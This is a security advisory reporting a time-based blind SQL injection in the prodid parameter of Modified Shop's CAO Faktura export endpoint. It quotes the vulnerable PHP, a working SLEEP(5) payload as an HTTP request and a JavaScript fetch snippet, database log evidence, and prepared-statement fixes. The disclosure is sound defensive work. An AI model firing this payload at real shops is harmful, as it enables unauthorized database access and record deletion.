# SQL Injection (Time-Based Blind) in CAO Faktura — `cao_xtc.php`

## Summary

A SQL Injection vulnerability was identified in the **CAO Faktura** module, specifically in the `products_erase` action of the `export/cao_xtc.php` endpoint.

The POST parameter `prodid` is directly incorporated into a SQL `DELETE` statement without numeric validation, proper SQL escaping, or the use of prepared statements.

The vulnerability was dynamically confirmed through a time-based injection using the MariaDB `SLEEP(5)` function.

## Vulnerability Identification

| Field | Information |
|---|---|
| Vulnerability | SQL Injection |
| Category | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
| Component | CAO Faktura |
| Endpoint | `/export/cao_xtc.php` |
| Method | POST |
| Parameter | `prodid` |
| Action | `products_erase` |
| Technique | Time-Based Blind SQL Injection |
| Tested Version | Modified Shop 3.3.0 rev. 16825 |
| Result | Dynamically Confirmed |
| Vendor | https://github.com/modified-shop/modified-shop |

## Technical Details

The `cao_xtc.php` endpoint receives the `products_erase` action and forwards execution to the `ProductsErase()` function, located in:

`export/cao_xtc_functions.php`

Vulnerable code:

```php
function ProductsErase ()
{
  global $_POST;
  $ProdID = xtc_db_prepare_input($_POST['prodid']);

  if (isset($ProdID))
  {
    $res1 = xtc_db_query(
      "delete from " . TABLE_PRODUCTS_TO_CATEGORIES .
      " where products_id='" . $ProdID . "'"
    );

    xtc_remove_product($ProdID);
    $code = 0;
    $message = 'OK';
  }
  else
  {
    $code = 99;
    $message = 'FAILED';
  }

  print_xml_status (0, $_POST['action'], 'OK', '', 'SQL_RES1', $res1);
}
```

The `xtc_db_prepare_input()` function, defined in `inc/db_functions.inc.php`, does not perform SQL sanitization:

```php
function xtc_db_prepare_input($string) {
  if (is_string($string)) {
    $string = trim(stripslashes($string));
  } elseif (is_array($string)) {
    foreach ($string as $key => $value) {
      $string[$key] = xtc_db_prepare_input($value);
    }
  }

  return $string;
}
```

Consequently, the user-controlled value remains directly concatenated into the SQL statement.

## Proof of Concept (PoC)

The PoC uses a conditional expression containing `SLEEP(5)` to demonstrate the execution of SQL controlled through the `prodid` parameter.

### HTTP Request

```http
POST /export/cao_xtc.php HTTP/1.1
Host: 172.25.44.135:8080
Content-Type: application/x-www-form-urlencoded

user=admin%40redscan.local&password=MD5_PASSWORD&action=products_erase&prodid=999999%27%20AND%20(SELECT%209898%20FROM%20(SELECT(SLEEP(5)))pmhr)%20AND%20%27zlFx%27%3D%27zlFx
```

### JavaScript Fetch PoC

Execute the following code in the browser console within the laboratory environment:

```javascript
(async () => {
  const endpoint =
    "http://172.25.44.135:8080/export/cao_xtc.php";

  const body = new URLSearchParams();

  body.set("user", "admin@redscan.local");
  body.set("password", "MD5_PASSWORD");
  body.set("action", "products_erase");

  body.set(
    "prodid",
    "999999' AND (SELECT 9898 FROM (SELECT(SLEEP(5)))pmhr) AND 'zlFx'='zlFx"
  );

  const start = performance.now();

  const response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: body.toString(),
    cache: "no-store",
    credentials: "same-origin"
  });

  const responseText = await response.text();

  console.log({
    status: response.status,
    redirected: response.redirected,
    elapsed:
      ((performance.now() - start) / 1000).toFixed(3) + "s",
    responseLength: responseText.length,
    responsePreview: responseText.substring(0, 500)
  });
})();
```

## Exploitation Evidence

The execution of the PoC produced the following results:

- HTTP Status: `200`
- Redirected: `false`
- Response Time: `5.057 seconds`
- Payload: `SLEEP(5)`

The MariaDB General Log recorded the following SQL query at `2026-11-05 21:43:23.511995`:

```sql
delete from products_to_categories
where products_id='999999'
AND (SELECT 9898 FROM (SELECT(SLEEP(5)))pmhr)
AND 'zlFx'='zlFx'
```

At `21:43:28.523414`, a subsequent SQL query was recorded:

```sql
DELETE FROM products_to_categories
WHERE products_id = '999999'
```

The approximately five-second difference between the log entries is consistent with the execution of the `SLEEP(5)` function.

This evidence confirms that the injected payload was incorporated into the SQL statement executed by the database server.

## Impact

An attacker with valid CAO Faktura service credentials and access to the vulnerable endpoint could manipulate the SQL query through the `prodid` parameter.

Depending on the database account privileges and exploitation conditions, successful exploitation could potentially allow:

- Inference of sensitive database information through blind SQL Injection techniques.
- Manipulation of SQL query conditions.
- Unauthorized deletion or modification of database records.
- Compromise of data confidentiality, integrity, and availability.

Exploitation requires access to the vulnerable endpoint and valid credentials accepted by the CAO Faktura authentication mechanism.

No authentication bypass was demonstrated in this PoC.

## Recommendations

1. Replace SQL parameter concatenation with prepared statements and bound parameters.
2. Validate the `prodid` parameter as a positive integer identifier before performing any database operation.
3. Do not rely on `xtc_db_prepare_input()` as a protection mechanism against SQL Injection.
4. Review all other SQL queries executed by the CAO Faktura module for similar vulnerabilities.
5. Restrict access to the integration endpoint to authorized sources.
6. Review the privileges granted to the database account used by the application and enforce the principle of least privilege.

### Remediation Example

The SQL query should use bound parameters instead of direct string concatenation:

```php
$stmt = $pdo->prepare(
    "DELETE FROM products_to_categories
     WHERE products_id = :products_id"
);

$stmt->execute([
    ':products_id' => $productId
]);
```

The implementation should use the database connection and data access layer adopted by the project.

## Conclusion

The SQL Injection vulnerability affecting the `prodid` parameter of the `products_erase` action in the CAO Faktura module was confirmed through static source code analysis and dynamic evidence recorded in the MariaDB General Log, demonstrating the execution of an injected `SLEEP(5)` expression.

The absence of proper input validation and parameterized SQL queries allows authenticated users to manipulate SQL statements executed by the database server.

**Status: Confirmed — Time-Based Blind SQL Injection.**
